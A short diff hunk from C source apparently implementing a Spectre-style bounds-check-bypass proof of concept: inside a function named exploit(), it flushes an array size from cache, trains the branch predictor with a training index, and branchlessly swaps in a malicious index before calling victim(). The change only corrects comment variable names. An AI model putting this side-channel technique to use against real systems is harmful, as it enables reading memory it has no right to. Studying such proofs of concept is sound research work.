@@ -38,10 +38,10 @@ size_t exploit(size_t address, int tries) {
         _mm_clflush(&buffer.indices_size);          // Flush indices array size from cache to force branch prediction
         flush_pipeline;
         
-        // Bit twiddling to set x = training_x if j % 6 != 0 or malicious_x if j % 6 == 0
+        // Bit twiddling to set x = training_x if i % 6 != 0 or malicious_x if i % 6 == 0
         // Avoid jumps in case those tip off the branch predictor
-        size_t x = ((i % 6) - 1) & ~0xFFFF; // Set x = FFFFF0000 if j % 6 == 0, else x = 0
-        x = (x | (x >> 16));                // Set x = -1 if j & 6 = 0, else x = 0
+        size_t x = ((i % 6) - 1) & ~0xFFFF; // Set x = FFFFF0000 if i % 6 == 0, else x = 0
+        x = (x | (x >> 16));                // Set x = -1 if i & 6 = 0, else x = 0
         x = training_x ^ (x & (malicious_x ^ training_x));
         
         victim(x);
